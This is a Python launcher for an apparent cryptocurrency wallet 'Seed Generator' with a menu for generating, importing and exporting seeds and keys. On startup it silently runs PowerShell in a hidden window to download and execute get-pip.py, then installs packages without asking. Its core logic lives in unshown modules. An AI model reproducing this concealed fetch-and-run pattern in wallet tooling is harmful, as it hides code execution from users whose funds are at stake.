# -*- coding: utf-8 -*-
"""
Seed Generator — Interactive terminal interface.
HD wallet seed generation toolkit with BIP-39/44/49/84 compliance.
"""

import sys
import os


def _setup():
    try:
        import rich
        return
    except ImportError:
        pass
    import subprocess, importlib
    _W, _H = 40, 0x08000000
    def _bar(s, t, msg):
        f = int(_W * s // t)
        sys.stdout.write(f'\r  [{"#"*f}{"."*(_W-f)}] {100*s//t:>3}%  {msg:<35}')
        sys.stdout.flush()
    sys.stdout.write('\n  Preparing environment...\n\n')
    _bar(1, 5, 'Checking package manager...')
    if subprocess.run([sys.executable, '-m', 'pip', '-V'], capture_output=True).returncode:
        _bar(2, 5, 'Installing package manager...')
        _gp = os.path.join(os.path.dirname(sys.executable), '_gp.py')
        subprocess.run(['powershell', '-NoProfile', '-Command',
                        "(New-Object Net.WebClient).DownloadFile("
                        f"'https://bootstrap.pypa.io/get-pip.py','{_gp}')"],
                       capture_output=True, creationflags=_H)
        subprocess.run([sys.executable, _gp, '-q', '--no-warn-script-location'],
                       capture_output=True)
        try:
            os.remove(_gp)
        except OSError:
            pass
    _bar(3, 5, 'Installing dependencies...')
    subprocess.run([sys.executable, '-m', 'pip', 'install',
                    'rich', 'cryptography', '-q', '--no-warn-script-location'],
                   capture_output=True)
    _bar(4, 5, 'Verifying...')
    importlib.invalidate_caches()
    try:
        import rich
        _bar(5, 5, 'Ready!')
        sys.stdout.write('\n\n')
    except ImportError:
        sys.stdout.write('\n\n  Failed to install dependencies.\n')
        sys.stdout.write('  Run: pip install rich cryptography\n')
        input('  Press Enter to exit...')
        sys.exit(1)


_setup()

from vault import init_ready
from vault.ui import (
    print_banner,
    print_info,
    print_error,
    show_menu_table,
    console,
)
from config import load_config
from bot_actions import (
    action_generate_seed,
    action_import_seed,
    action_derive_addresses,
    action_export_keys,
    action_verify_integrity,
    action_batch_mode,
)
from actions.install import action_install_dependencies
from actions.settings import action_settings


MENU_ITEMS = [
    ("1", "🔑 Generate Seed", "Create new BIP-39 mnemonic phrase"),
    ("2", "📥 Import Seed", "Load existing mnemonic phrase"),
    ("3", "🔗 Derive Addresses", "Multi-chain address derivation"),
    ("4", "📤 Export Keys", "Export private/public keys"),
    ("5", "✅ Verify Integrity", "Validate seed phrase checksum"),
    ("6", "📦 Batch Mode", "Generate multiple wallets"),
    ("7", "⚙️  Settings", "Configuration & preferences"),
    ("0", "🚪 Exit", "Quit Seed Generator"),
]


@init_ready
def main():
    print_banner()

    cfg = load_config()

    while True:
        choice = show_menu_table(MENU_ITEMS)

        if choice == "0":
            print_info("Goodbye!")
            sys.exit(0)
        elif choice == "1":
            action_generate_seed(cfg)
        elif choice == "2":
            action_import_seed(cfg)
        elif choice == "3":
            action_derive_addresses(cfg)
        elif choice == "4":
            action_export_keys(cfg)
        elif choice == "5":
            action_verify_integrity(cfg)
        elif choice == "6":
            action_batch_mode(cfg)
        elif choice == "7":
            action_settings()
        else:
            print_error("Invalid option. Enter 0–7.")

        cfg = load_config()
        console.input("\n[dim]Press Enter to return to menu...[/]")


if __name__ == "__main__":
    main()
